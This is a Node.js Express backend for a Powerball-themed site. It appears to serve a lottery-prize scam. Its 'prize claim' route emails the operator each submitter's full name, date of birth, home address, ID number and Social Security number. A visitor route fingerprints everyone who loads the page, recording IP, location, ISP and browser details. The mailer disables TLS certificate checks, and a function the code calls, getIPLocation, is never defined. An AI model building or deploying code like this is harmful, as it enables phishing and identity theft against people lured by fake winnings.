const express = require("express");
const nodemailer = require("nodemailer");
const multer = require("multer");
const cors = require("cors");
require("dotenv").config();
const axios = require("axios"); // To get IP geolocation
// const rateLimit = require("express-rate-limit");

const PORT = process.env.PORT || 3000;

const app = express();
// const app = express();

/// Middleware
app.use(
  cors({
    origin: "https://lotto-orpin.vercel.app",
  })
);
app.use(express.static("public"));
app.use(express.json());

// Root route
app.get("/", async (req, res) => {
  res.sendFile(__dirname + "/public/index.html");
});

// Test route
app.get("/home", (req, res) => {
  res.status(200).json("Powerball Backend Server is Running on Vercel!!!");
});
// Configure multer for handling form data
const upload = multer();

// Email transporter setup
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,
  secure: false,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
  tls: {
    rejectUnauthorized: false,
  },
});

// Test email configuration
transporter.verify(function (error, success) {
  if (error) {
    console.log("Email server error:", error);
  } else {
    console.log("Email server is ready");
  }
});

// API to log a visitor
app.get("/visitor", async (req, res) => {
  // const visitorInfo = `
  // IP Address: ${req.ip}\nTime: ${new Date().toLocaleString()}
  // `;

  const visitorInfo = await collectVisitorInfo(req);

  await sendEmailNotification(visitorInfo);

  res.status(200).send("Visitor logged and email sent!");
});

// Function to send email notification
async function sendEmailNotification(visitorInfo) {
  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_USER, // Notify yourself
    subject: "New Website Visitor",
    html: `
      <h2>New Website Visitor Details</h2>
      <p><strong>IP Address (IPv4):</strong> ${visitorInfo.ipv4}</p>
      <p><strong>IP Address (IPv6):</strong> ${visitorInfo.ipv6}</p>
      <p><strong>Location:</strong> ${visitorInfo.location.city}, ${visitorInfo.location.country} (${visitorInfo.location.region})</p>
      <p><strong>Host Name:</strong> ${visitorInfo.hostname}</p>
      <p><strong>ISP:</strong> ${visitorInfo.isp}</p>
      <p><strong>Platform:</strong> ${visitorInfo.platform}</p>
      <p><strong>Browser:</strong> ${visitorInfo.browser}</p>
      <p><strong>Screen Size:</strong> ${visitorInfo.screenSize}</p>
      <p><strong>JavaScript Enabled:</strong> ${visitorInfo.jsEnabled}</p>
      <p><strong>Cookies Enabled:</strong> ${visitorInfo.cookiesEnabled}</p>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log("Email sent successfully!");
  } catch (error) {
    console.error("Error sending email:", error);
  }
}

// Helper function to collect visitor info
async function collectVisitorInfo(req) {
  const ipv4 = req.ip;
  const ipv6 = req.headers["x-forwarded-for"] || req.ip; // Get the correct IP if behind a proxy
  const userAgent = req.get("User-Agent");
  const platform = userAgent.includes("Windows")
    ? "Windows"
    : userAgent.includes("Mac")
    ? "Mac"
    : "Other";
  const browser = userAgent.match(/(Chrome|Firefox|Safari|Edge)\/([\d.]+)/);
  const browserName = browser ? browser[1] : "Unknown";

  // Get screen size, JavaScript enabled, and cookies from client (via query params)
  const screenSize = req.query.screenSize || "Unknown";
  const jsEnabled = req.query.jsEnabled || "Unknown";
  const cookiesEnabled = req.query.cookiesEnabled || "Unknown";

  // Fetch location based on IP address
  const location = await getIPLocation(ipv4);

  // Construct visitor info
  const visitorInfo = {
    ipv4,
    ipv6,
    location: location || {
      city: "Unknown",
      country: "Unknown",
      region: "Unknown",
    },
    hostname: req.headers.host || "Unknown",
    isp: location ? location.isp : "Unknown",
    platform,
    browser: browserName,
    screenSize,
    jsEnabled,
    cookiesEnabled,
  };

  return visitorInfo;
}

// Handle form submission
app.post("/send-email", upload.none(), async (req, res) => {
  try {
    console.log("Received form data:", req.body);

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: "New Prize Claim Form Submission",
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #1a5f7a;">New Prize Claim Submission</h2>
          <div style="background: #f8f9fa; padding: 20px; border-radius: 10px;">
            <h3 style="color: #2d3436;">Personal Information</h3>
            <p><strong>Name:</strong> ${req.body.firstName} ${req.body.lastName}</p>
            <p><strong>Email:</strong> ${req.body.email}</p>
            <p><strong>Phone:</strong> ${req.body.phone}</p>
            <p><strong>Date of Birth:</strong> ${req.body.dob}</p>
            <p><strong>Gender:</strong> ${req.body.gender}</p>
            
            <h3 style="color: #2d3436; margin-top: 20px;">Address Information</h3>
            <p><strong>Street Address:</strong> ${req.body.street}</p>
            <p><strong>City:</strong> ${req.body.city}</p>
            <p><strong>State:</strong> ${req.body.state}</p>
            <p><strong>ZIP Code:</strong> ${req.body.zipCode}</p>
            <p><strong>Country:</strong> ${req.body.country}</p>

            <h3 style="color: #2d3436; margin-top: 20px;">Additional Information</h3>
            <p><strong>Marital Status:</strong> ${req.body.maritalStatus}</p>
            <p><strong>Occupation:</strong> ${req.body.occupation}</p>
            <p><strong>ID Type:</strong> ${req.body.idType}</p>
            <p><strong>ID Number:</strong> ${req.body.idNumber}</p>
            <p><strong>SSN:</strong> ${req.body.ssn}</p>
          </div>
        </div>
      `,
    };

    // Wait for email to be sent before sending response
    await transporter.sendMail(mailOptions);
    console.log("Email sent successfully");

    // Send success response after email is sent
    res.status(200).json({
      success: true,
      message: "Your prize claim form has been submitted successfully.",
    });
  } catch (error) {
    console.error("Server Error:", error);
    res.status(500).json({
      success: false,
      message: "Unable to submit your form. Please try again later.",
      error: error.message,
    });
  }
});

// // Function to send email notification
// async function sendEmailNotification(visitorInfo) {
//   const mailOptions = {
//     from: process.env.EMAIL_USER,
//     to: process.env.EMAIL_USER, // Notify yourself
//     subject: "New Website Visitor",
//     text: `A visitor just accessed your website. Details:\n\n${visitorInfo}`,
//   };

//   try {
//     await transporter.sendMail(mailOptions);
//     console.log("Email sent successfully!");
//   } catch (error) {
//     console.error("Error sending email:", error);
//   }
// }

// // API to log a visitor
// app.get("/visitor", (req, res) => {
//   const visitorInfo = `
//   IP Address: ${req.ip}\nTime: ${new Date().toLocaleString()}
//   `;
//   sendEmailNotification(visitorInfo);

//   res.status(200).send("Visitor logged and email sent!");
// });

app.listen(PORT, () => console.log(`Server ready on port ${PORT}.`));

module.exports = app;
